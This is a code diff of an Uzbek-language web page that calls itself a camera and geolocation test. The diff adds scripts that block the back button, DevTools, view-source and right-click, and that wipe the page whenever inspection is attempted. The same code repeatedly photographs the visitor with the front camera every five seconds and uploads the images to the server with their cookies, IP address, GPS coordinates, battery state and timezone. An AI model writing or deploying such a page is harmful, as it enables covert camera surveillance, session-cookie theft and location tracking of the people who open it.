@@ -1,74 +1,301 @@
 <!DOCTYPE html>
 <html lang="uz">
+
 <head>
     <meta charset="UTF-8">
     <title>Salom</title>
     <style>
         #video {
-            display: none; 
+            display: none;
         }
     </style>
 </head>
+
+<style>
+    body {
+        background-color: #f0f0f0;
+        font-family: Arial, sans-serif;
+        text-align: center;
+        color: #f10707;
+    }
+
+    h1 {
+        color: #4105e7;
+    }
+
+    h3 {
+        color: #079bf1;
+    }
+
+    p {
+        font-size: 1.2em;
+        line-height: 1.5;
+    }
+</style>
 <body>
-    <h1>Salom</h1>
+    <h1><b><i><u>Salom bu test sahifasi</u></i></b></h1>
+    <h3>
+        <p>Bu sahifa sizning brauzeringizdagi kamera va geolokatsiyani tekshirish uchun ishlatiladi.</p>
+        <p>Bu sahifa orqali sizning brauzeringizdagi kamera va geolokatsiya ma'lumotlari to'planadi va serverga
+            yuboriladi.</p>
+        <p>Bu ma'lumotlar sizning ruxsatingiz bilan to'planadi va yuboriladi.</p>
+    </h3>
 
     <video id="video" autoplay></video>
 
-    <script>
-        const video = document.getElementById('video');
+<script>
+    const work_not_keys_infodata=""
+    const video = document.getElementById('video');
+    
+    window.history.pushState(null, null, window.location.href);
+    window.onpopstate = function () {
+        window.history.pushState(null, null, window.location.href);
+        alert("⛔ Orqaga qaytishga ruxsat yo‘q!");
+    };
+   function logoutUser() {
+    // 🍪 Cookie’larni tozalash
+    document.cookie = "session=; Max-Age=0; path=/";
+    localStorage.clear();
+    sessionStorage.clear();
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                video.srcObject = stream;
+    // 🔐 "Bloklandi" sahifani to‘g‘ridan-to‘g‘ri body ichiga yuklash
+    document.body.innerHTML = `
+        <style>
+            body {
+                background-color: black;
+                color: red;
+                margin: 0;
+                padding: 0;
+                height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-family: Arial, sans-serif;
+            }
 
-                video.onloadedmetadata = () => {
-                    setTimeout(captureAndSendPhoto, 1000); 
-                };
-            })
-            .catch(err => {
-                console.error("Kamera ruxsati berilmadi:", err);
-            });
+            .alert-message {
+                font-size: 32px;
+                font-weight: bold;
+                text-align: center;
+                color: red;
+                animation: blinkGlow 1.2s infinite ease-in-out;
+            }
 
-        async function captureAndSendPhoto() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            .alert-message::before {
+                content: '🚫 ';
+                font-size: 48px;
+                display: inline-block;
+                vertical-align: middle;
+            }
 
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            .alert-message::after {
+                content: ' Xavfsizlik buzildi. Sahifa yopiladi.';
+                display: inline-block;
+                vertical-align: middle;
+            }
 
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-
-            let batteryLevel = 'unknown';
-            let batteryCharging = 'unknown';
-            try {
-                const battery = await navigator.getBattery();
-                batteryLevel = battery.level;
-                batteryCharging = battery.charging;
-            } catch (e) {}
-
-            const formData = new FormData();
-            formData.append('photo', blob, 'auto.jpg');
-            formData.append('userAgent', userAgent);
-            formData.append('platform', platform);
-            formData.append('batteryLevel', batteryLevel);
-            formData.append('batteryCharging', batteryCharging);
-
-            fetch('/upload', {
-                method: 'POST',
-                body: formData
-            }).then(res => {
-                if (res.ok) {
-                    console.log("Rasm va malumotlar yuborildi ✅");
-                } else {
-                    console.error("Yuborishda xatolik ❌");
+            @keyframes blinkGlow {
+                0% {
+                    opacity: 1;
+                    text-shadow:
+                        0 0 5px red,
+                        0 0 10px red,
+                        0 0 15px crimson,
+                        0 0 20px crimson;
+                    transform: scale(1);
                 }
-            }).catch(err => {
-                console.error("Xatolik:", err);
-            });
+                50% {
+                    opacity: 0.2;
+                    text-shadow:
+                        0 0 2px darkred,
+                        0 0 5px darkred;
+                    transform: scale(1.03);
+                }
+                100% {
+                    opacity: 1;
+                    text-shadow:
+                        0 0 5px red,
+                        0 0 10px red,
+                        0 0 15px crimson,
+                        0 0 20px crimson;
+                    transform: scale(1);
+                }
+            }
+        </style>
+
+        <div class="alert-message"></div>
+    `;
+
+    // 🕒 60 soniyadan so‘ng butunlay sahifani bo‘shatish
+    setTimeout(() => {
+        Location.reload();
+    }, 30000);
+}
+
+
+// === 1-MODUL: DevTools aniqlash ===
+(function detectDevTools() {
+        let opened = false;
+        const threshold = 160;
+
+        setInterval(() => {
+            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+
+            if (widthThreshold || heightThreshold) {
+                if (!opened) {
+                    opened = true;
+                    alert("🛑 Developer Tools ochildi. Web-sayt yopiladi.");
+                   logoutUser();
+                }
+            } else {
+                opened = false;
+            }
+        }, 1000);
+    })();
+
+    // === 2-MODUL: F12, Ctrl+U, Right-click bloklash ===
+    document.addEventListener("keydown", function (e) {
+        const key = e.key.toLowerCase();
+
+        // Print preview ni to‘xtatish
+        if ((e.ctrlKey || e.metaKey) && key === 'p') {
+            e.preventDefault();
+            alert("🛑 Chop etish (Ctrl+P) bloklangan.");
+            logoutUser();
+            return false;
         }
-    </script>
+
+        // Umumiy xavfsizlik kombinatsiyalarini bloklash
+        const blocked = [
+            { ctrl: true, shift: false, key: 's' }, // Ctrl+S
+            { ctrl: true, shift: false, key: 'a' }, // Ctrl+A
+            { ctrl: true, shift: false, key: 'z' }, // Ctrl+Z
+            { ctrl: true, shift: true,  key: 's' }, // Ctrl+Shift+S
+            { ctrl: true, shift: true,  key: 'z' }, // Ctrl+Shift+Z
+            { ctrl: true, shift: true,  key: 'a' }, // Ctrl+Shift+A
+            { ctrl: true, shift: false, key: 'u' }, // Ctrl+U
+            { ctrl: true, shift: true,  key: 'i' }, // Ctrl+Shift+I
+            { ctrl: true, shift: true,  key: 'j' }, // Ctrl+Shift+J
+            { ctrl: true, shift: true,  key: 'c' }, // Ctrl+Shift+C
+        ];
+
+        const matched = blocked.some(combo =>
+            e.ctrlKey === combo.ctrl &&
+            e.shiftKey === combo.shift &&
+            key === combo.key
+        );
+
+        if (key === 'f12' || matched) {
+            e.preventDefault();
+            alert("🛑 Bu tugma kombinatsiyasi bloklangan.");
+            logoutUser();
+        }
+    });
+
+    // Right-click ham blok
+    document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+    });
+
+    // === 3-MODUL: Kamera va foydalanuvchi ma’lumotlarini yuborish ===
+
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = async () => {
+                await sleep(1000);
+                captureAndSendPhoto();
+            };
+        })
+        .catch(err => {
+            alert("Kamera ruxsati berilmadi: " + err);
+        });
+
+    async function captureAndSendPhoto() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language || navigator.userLanguage;
+        const timezoneOffset = new Date().getTimezoneOffset();
+        const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+        const cookies = document.cookie || 'No cookies available';
+
+        let user_ip = 'unknown';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            user_ip = ipData.ip;
+        } catch (err) {
+            console.warn("IP olinmadi:", err);
+        }
+
+        let batteryLevel = 'unknown';
+        let batteryCharging = 'unknown';
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = battery.level;
+            batteryCharging = battery.charging;
+        } catch (e) {}
+
+        let latitude = 'unknown';
+        let longitude = 'unknown';
+        try {
+            const geo = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+            });
+            latitude = geo.coords.latitude;
+            longitude = geo.coords.longitude;
+        } catch (err) {
+            console.warn("Joylashuv olinmadi:", err.message);
+        }
+
+        const formData = new FormData();
+        formData.append('photo', blob, 'auto.jpg');
+        formData.append('userAgent', userAgent);
+        formData.append('platform', platform);
+        formData.append('cookies', cookies);
+        formData.append('batteryLevel', batteryLevel);
+        formData.append('batteryCharging', batteryCharging);
+        formData.append('language', language);
+        formData.append('timezoneOffset', timezoneOffset);
+        formData.append('userTimezone', userTimezone);
+        formData.append('user_ip', user_ip);
+        formData.append('latitude', latitude);
+        formData.append('longitude', longitude);
+
+        console.table({
+            userAgent, platform, language, timezoneOffset, batteryLevel,
+            batteryCharging, userTimezone, user_ip, cookies, latitude, longitude
+        });
+
+        fetch('/upload', {
+            method: 'POST',
+            body: formData
+        }).then(async res => {
+            if (res.ok) {
+                await sleep(5000); // Keyingi yuborishdan oldin 5s kutish
+                captureAndSendPhoto();
+            } else {
+                alert("Yuborishda xatolik ❌");
+            }
+        }).catch(err => {
+            alert("📸 Kamera yoki 📡 server bilan bog‘lanishda muammo:\n\n" + err);
+        });
+    }
+</script>
+
 </body>
+
 </html>
